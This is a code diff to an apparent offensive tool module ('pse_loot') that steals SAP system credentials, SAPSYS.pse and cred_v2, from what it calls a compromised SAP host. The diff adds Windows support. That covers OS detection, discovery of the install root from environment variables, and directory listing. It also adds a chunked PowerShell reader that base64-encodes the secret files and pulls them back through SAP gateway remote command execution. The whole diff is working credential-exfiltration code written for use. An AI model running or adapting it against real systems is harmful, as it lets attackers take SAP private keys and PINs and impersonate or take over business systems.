@@ -76,32 +76,55 @@ DEFAULT_PSE_FILENAMES = ("SAPSYS.pse",)
 DEFAULT_CRED_FILENAMES = ("cred_v2",)
 
 
-def _instance_secudir(sid: str, instance_dir: str) -> str:
+def _instance_secudir(sid: str, instance_dir: str,
+                       sap_root: str = "/usr/sap",
+                       sep: str = "/") -> str:
     """Return the per-instance SECUDIR path for `<SID>` + `<INST_DIR>`.
 
-    `instance_dir` is the dispatcher's directory name (e.g. "D00",
-    "DVEBMGS01", "ASCS00") — not just the 2-digit instance number.
-    Path layout is uniform across NW 7.0x → 7.5x.
+    Linux defaults to /usr/sap/<SID>/<INST_DIR>/sec.  Windows callers
+    pass sap_root='<drive>:\\usr\\sap' and sep='\\\\' so the same
+    formula yields '<drive>:\\usr\\sap\\<SID>\\<INST_DIR>\\sec'.  Path
+    layout is otherwise uniform across NW 7.0x → 7.5x.
     """
-    return f"/usr/sap/{sid.upper()}/{instance_dir}/sec"
+    return f"{sap_root}{sep}{sid.upper()}{sep}{instance_dir}{sep}sec"
 
 
-def _global_secudir(sid: str) -> str:
+def _global_secudir(sid: str, sap_root: str = "/usr/sap",
+                    sep: str = "/") -> str:
     """Return the global/HA-shared SECUDIR path for `<SID>`."""
-    return f"/usr/sap/{sid.upper()}/SYS/global/security/data"
+    return (f"{sap_root}{sep}{sid.upper()}{sep}SYS{sep}global{sep}"
+            f"security{sep}data")
 
 
-def candidate_secudirs(sid: str, instance_dir: str) -> list:
+def candidate_secudirs(sid: str, instance_dir: str,
+                       os_type: str = "linux",
+                       sap_root: str = "") -> list:
     """Ordered list of paths to try when locating SAPSYS.pse + cred_v2.
 
     Per-instance first (matches the dispatcher we have OS-exec on),
     global second (HA-shared layout, sometimes the only one populated
     on systems where the instance copy is just a symlink that we'd
     rather skip indirection on).
+
+    Args:
+        sid:          SAP system ID (case-insensitive)
+        instance_dir: Dispatcher's directory name on disk
+        os_type:      'linux' (default) or 'windows'
+        sap_root:     Explicit install root override.  When empty falls
+                      back to /usr/sap on Linux or C:\\usr\\sap on
+                      Windows.  Operators with non-standard layouts
+                      (e.g. P:\\usr\\sap on the operator's TWT) should
+                      supply the value discovered via DIR_LIBRARY.
     """
+    if os_type == "windows":
+        root = sap_root or r"C:\usr\sap"
+        sep = "\\"
+    else:
+        root = sap_root or "/usr/sap"
+        sep = "/"
     return [
-        _instance_secudir(sid, instance_dir),
-        _global_secudir(sid),
+        _instance_secudir(sid, instance_dir, root, sep),
+        _global_secudir(sid, root, sep),
     ]
 
 
@@ -412,14 +435,26 @@ def make_chunked_read_adapter(raw_exec_fn: GwExecFn,
     return adapted
 
 
-def _list_dir(gw_exec_fn: GwExecFn, path: str) -> list:
+def _list_dir(gw_exec_fn: GwExecFn, path: str,
+              os_type: str = "linux") -> list:
     """Return list of filenames in `path` (empty list on failure).
 
     Used for discovery — when we don't know which SECUDIR variant
-    holds the live PSE on a given system, ls each candidate and
+    holds the live PSE on a given system, list each candidate and
     pick the one that actually contains SAPSYS.pse + cred_v2.
+
+    OS-aware: Linux uses ``ls``; Windows uses ``cmd /C dir /B``
+    which prints one bare filename per line (no metadata, no header).
     """
-    r = gw_exec_fn("ls", path)
+    if os_type == "windows":
+        # cmd.exe /C dir /B emits filenames only (one per line) — no
+        # banner, no column headers, no trailing summary.  The /A:-D
+        # variant would exclude directories; we include them so an
+        # operator who points at the parent secudir sees the contents
+        # for diagnostics.
+        r = gw_exec_fn("cmd.exe", f'/C dir /B "{path}"')
+    else:
+        r = gw_exec_fn("ls", path)
     if not r.get("success"):
         return []
     names = []
@@ -427,10 +462,181 @@ def _list_dir(gw_exec_fn: GwExecFn, path: str) -> list:
         line = line.strip()
         if not line or _looks_like_error(line):
             continue
-        # ls can return one file per line; on some shells columns are
-        # space-separated.  Split on whitespace to be safe.
-        names.extend(line.split())
+        # Windows dir /B emits "File Not Found" on missing paths —
+        # treat as empty.  Linux ls already covered by _looks_like_error.
+        if "file not found" in line.lower():
+            continue
+        # ls can return one file per line; cmd /C dir /B always does.
+        # Split on whitespace as a safety net for column-mode ls.
+        if os_type == "windows":
+            names.append(line)        # Windows filenames may contain spaces
+        else:
+            names.extend(line.split())
     return names
+
+
+# ---------------------------------------------------------------------------
+# OS detection + Windows install-root discovery
+# ---------------------------------------------------------------------------
+
+def _detect_os(gw_exec_fn: GwExecFn) -> str:
+    """Return 'windows' or 'linux' for the target reachable through
+    ``gw_exec_fn``.  Runs ``cmd /C ver`` which succeeds on Windows
+    only (echoes "Microsoft Windows [Version …]"); any failure or
+    non-Windows output is treated as Linux.
+
+    The check is intentionally cheap (one SAPXPG round-trip) so it
+    can be the first thing extract_pse_bundle does.
+    """
+    try:
+        r = gw_exec_fn("cmd.exe", "/C ver")
+    except Exception:
+        return "linux"
+    if not r.get("success"):
+        return "linux"
+    out = " ".join(r.get("output", []) or []).lower()
+    return "windows" if "microsoft" in out and "windows" in out else "linux"
+
+
+# Regex to pull the install root (<drive>:\usr\sap) from a Windows env
+# block.  DIR_LIBRARY is always set in a running SAP service env on
+# Windows and points to <drive>:\usr\sap\<SID>\<INST>\exe — strip the
+# trailing three components to get the install root.
+_WIN_DIR_LIBRARY_RE = _re_compile = __import__("re").compile(
+    r"^DIR_LIBRARY=([A-Za-z]:\\.*?)(?:\\[^\\]+){3}\s*$",
+    __import__("re").M | __import__("re").I)
+
+
+def _discover_sap_root_windows(gw_exec_fn: GwExecFn,
+                                label: str = "") -> str:
+    """Discover the SAP install root on a Windows target.
+
+    Reads the SAPXPG environment via ``cmd /C set``, parses out
+    DIR_LIBRARY (always set in a running SAP service account env),
+    and returns the install root (drive + ``\\usr\\sap``).  Operators
+    routinely install SAP on a dedicated drive (P:, D:, E:) instead of
+    C:, which is why hard-coding ``C:\\usr\\sap`` doesn't work in the
+    field.
+
+    Returns "" when DIR_LIBRARY can't be read (caller falls back to
+    the hard-coded default C:\\usr\\sap).
+    """
+    tag = f"[*] {label}: pse_loot" if label else "[*] pse_loot"
+    try:
+        r = gw_exec_fn("cmd.exe", "/C set")
+    except Exception:
+        return ""
+    if not r.get("success"):
+        return ""
+    out = "\n".join(r.get("output", []) or [])
+    m = _WIN_DIR_LIBRARY_RE.search(out)
+    if not m:
+        return ""
+    usr_sap = m.group(1).rstrip("\\")
+    print(f"{tag}: DIR_LIBRARY → SAP install root {usr_sap}")
+    return usr_sap
+
+
+def _read_file_b64_windows(gw_exec_fn: GwExecFn, path: str,
+                            chunk_raw_bytes: int = 72,
+                            verbose: bool = False) -> dict:
+    """Chunked binary read on a Windows target via PowerShell.
+
+    Mirrors the Linux ``make_chunked_read_adapter._read_chunked`` path
+    but uses PowerShell's Get-Content -Encoding Byte slicing instead of
+    Python3's open().read()[O:E].  Each chunk emits one base64 line of
+    ~96 chars, which fits SAPXPG's ~128-byte per-TLV stdout ceiling.
+
+    Returns the standard ``{success, bytes, error, raw_output}`` shape
+    so callers can substitute this for ``_read_file_b64`` on Windows
+    targets transparently.
+    """
+    import base64 as _b64_mod
+
+    result = {"success": False, "bytes": None, "error": "",
+              "raw_output": []}
+
+    # Size first — Get-Item returns the size via .Length
+    r_sz = gw_exec_fn(
+        "powershell",
+        f"-Command \"(Get-Item '{path}').Length\"")
+    if not r_sz.get("success"):
+        result["error"] = "powershell Get-Item failed: file may not exist"
+        return result
+    size = -1
+    for ln in r_sz.get("output", []) or []:
+        ln = ln.strip()
+        if ln.isdigit():
+            size = int(ln); break
+    if size < 0:
+        result["error"] = (f"powershell Get-Item returned no size for "
+                            f"{path} — file likely doesn't exist")
+        return result
+    if size == 0:
+        result["success"] = True
+        result["bytes"] = b""
+        return result
+
+    n_chunks = (size + chunk_raw_bytes - 1) // chunk_raw_bytes
+    import time as _t
+    started = _t.time()
+    print(f"  [chunked] {path}: {size}B → {n_chunks} chunk(s) of "
+          f"{chunk_raw_bytes}B via PowerShell")
+
+    all_bytes = bytearray()
+    progress_every = max(1, n_chunks // 10)
+    for i in range(n_chunks):
+        beg = i * chunk_raw_bytes
+        end_excl = min(beg + chunk_raw_bytes, size)
+        end_inc = end_excl - 1
+        # PowerShell -Encoding Byte returns a [byte[]] which we slice
+        # then base64-encode and emit as a single line.
+        ps_cmd = (
+            f"$b = [IO.File]::ReadAllBytes('{path}'); "
+            f"[Convert]::ToBase64String($b[{beg}..{end_inc}])")
+        r = gw_exec_fn("powershell", f'-Command "{ps_cmd}"')
+        if not r.get("success"):
+            result["error"] = (
+                f"PowerShell chunk {i+1}/{n_chunks} failed: "
+                f"{r.get('error') or '(no error)'}")
+            return result
+        # First non-blank line of output should be the base64 string.
+        chunk_b64 = ""
+        for ln in r.get("output", []) or []:
+            ln = ln.strip()
+            if ln and not _looks_like_error(ln):
+                chunk_b64 = ln
+                break
+        if not chunk_b64:
+            result["error"] = (
+                f"PowerShell chunk {i+1}/{n_chunks} returned no base64 "
+                f"line ({len(r.get('output') or [])} output lines)")
+            return result
+        try:
+            all_bytes.extend(_b64_mod.b64decode(chunk_b64))
+        except Exception as e:
+            result["error"] = (f"chunk {i+1} base64 decode failed: {e}")
+            return result
+
+        n_done = i + 1
+        if (n_done == 1 or n_done == n_chunks
+                or n_done % progress_every == 0):
+            elapsed = _t.time() - started
+            rate = end_excl / elapsed if elapsed > 0 else 0
+            eta = (size - end_excl) / rate if rate > 0 else 0
+            pct = (n_done * 100) // n_chunks
+            print(f"  [chunked] chunk {n_done}/{n_chunks} ({pct:3d}%) — "
+                  f"{end_excl}B/{size}B @ {rate:.0f} B/s — ETA {eta:.0f}s")
+
+    if len(all_bytes) != size:
+        result["error"] = (f"size mismatch: got {len(all_bytes)}B "
+                            f"expected {size}B")
+        return result
+
+    print(f"  [chunked] done: {size}B in {_t.time() - started:.1f}s")
+    result["success"] = True
+    result["bytes"] = bytes(all_bytes)
+    return result
 
 
 # ---------------------------------------------------------------------------
@@ -495,7 +701,8 @@ def extract_pse_bundle(gw_exec_fn: GwExecFn, sid: str,
                         instance_dir: str = "D00",
                         secudir: Optional[str] = None,
                         save_loot: bool = True,
-                        label: str = "") -> dict:
+                        label: str = "",
+                        os_type: Optional[str] = None) -> dict:
     """Extract SAPSYS.pse + cred_v2 from a compromised SAP host.
 
     Args:
@@ -558,16 +765,37 @@ def extract_pse_bundle(gw_exec_fn: GwExecFn, sid: str,
         print(f"{tag}: whoami failed -- assuming "
               f"{result['sidadm_user']!r} (standard <sid>adm convention)")
 
+    # OS detection — runs once at the top so all downstream primitives
+    # (path build, listing, file read) can branch on it.  Auto-detect via
+    # cmd /C ver when the caller didn't supply an os_type hint.  We also
+    # cross-check against the whoami output: Windows whoami emits
+    # "<host>\<user>" with a backslash, Linux emits just "<user>".
+    if os_type is None:
+        os_type = _detect_os(gw_exec_fn)
+    if "\\" in (result.get("sidadm_user") or ""):
+        # whoami says Windows — trust it over a possibly-flaky cmd ver
+        os_type = "windows"
+    print(f"{tag}: OS detected: {os_type}")
+
+    # Discover the SAP install root on Windows (operator's TWT lives on
+    # P:\usr\sap, not the default C:\).  Linux always uses /usr/sap so
+    # no discovery needed there.
+    sap_root = ""
+    if os_type == "windows":
+        sap_root = _discover_sap_root_windows(gw_exec_fn, label=label)
+
     # Step 2: locate SECUDIR — try the candidates in order.
     candidates = ([secudir] if secudir
-                  else candidate_secudirs(sid, instance_dir))
+                  else candidate_secudirs(sid, instance_dir,
+                                            os_type=os_type,
+                                            sap_root=sap_root))
     print(f"{tag}: SECUDIR candidates: {candidates}")
 
     chosen_dir = ""
     listing = []
     for candidate in candidates:
         print(f"{tag}: probing {candidate} ...")
-        files = _list_dir(gw_exec_fn, candidate)
+        files = _list_dir(gw_exec_fn, candidate, os_type=os_type)
         if not files:
             print(f"{tag}:   empty / unreadable")
             continue
@@ -602,10 +830,23 @@ def extract_pse_bundle(gw_exec_fn: GwExecFn, sid: str,
     ]
     print(f"{tag}: SECUDIR = {chosen_dir} (contains {len(listing)} files)")
 
-    # Step 3: read the PSE
-    pse_path = os.path.join(chosen_dir, "SAPSYS.pse")
-    print(f"{tag}: reading {pse_path} via base64 ...")
-    r_pse = _read_file_b64(gw_exec_fn, pse_path)
+    # OS-aware path joining: os.path.join on the OPERATOR'S box
+    # follows the operator's OS, not the target's.  Build the join
+    # manually so a Linux operator targeting a Windows SAP picks the
+    # right separator.
+    sep = "\\" if os_type == "windows" else "/"
+    pse_path = chosen_dir.rstrip(sep) + sep + "SAPSYS.pse"
+    cred_path = chosen_dir.rstrip(sep) + sep + "cred_v2"
+
+    # Step 3: read the PSE.  Windows uses the dedicated PowerShell
+    # chunked reader; Linux keeps the existing base64 path (chunked
+    # via make_chunked_read_adapter when the caller wrapped exec_fn).
+    print(f"{tag}: reading {pse_path} via "
+          f"{'PowerShell chunks' if os_type == 'windows' else 'base64'} ...")
+    if os_type == "windows":
+        r_pse = _read_file_b64_windows(gw_exec_fn, pse_path)
+    else:
+        r_pse = _read_file_b64(gw_exec_fn, pse_path)
     if not r_pse["success"]:
         result["error"] = f"SAPSYS.pse read failed: {r_pse['error']}"
         print(f"{tag}: ABORT — {result['error']}")
@@ -616,10 +857,13 @@ def extract_pse_bundle(gw_exec_fn: GwExecFn, sid: str,
     # Step 4: read cred_v2 (best-effort — its absence isn't fatal
     # at extract time; the operator can supply the PIN manually if
     # cred_v2 lives somewhere unusual)
-    cred_path = os.path.join(chosen_dir, "cred_v2")
     if "cred_v2" in listing:
-        print(f"{tag}: reading {cred_path} via base64 ...")
-        r_cred = _read_file_b64(gw_exec_fn, cred_path)
+        print(f"{tag}: reading {cred_path} via "
+              f"{'PowerShell chunks' if os_type == 'windows' else 'base64'} ...")
+        if os_type == "windows":
+            r_cred = _read_file_b64_windows(gw_exec_fn, cred_path)
+        else:
+            r_cred = _read_file_b64(gw_exec_fn, cred_path)
         if r_cred["success"]:
             result["cred_v2_bytes"] = r_cred["bytes"]
             print(f"{tag}: cred_v2 retrieved "
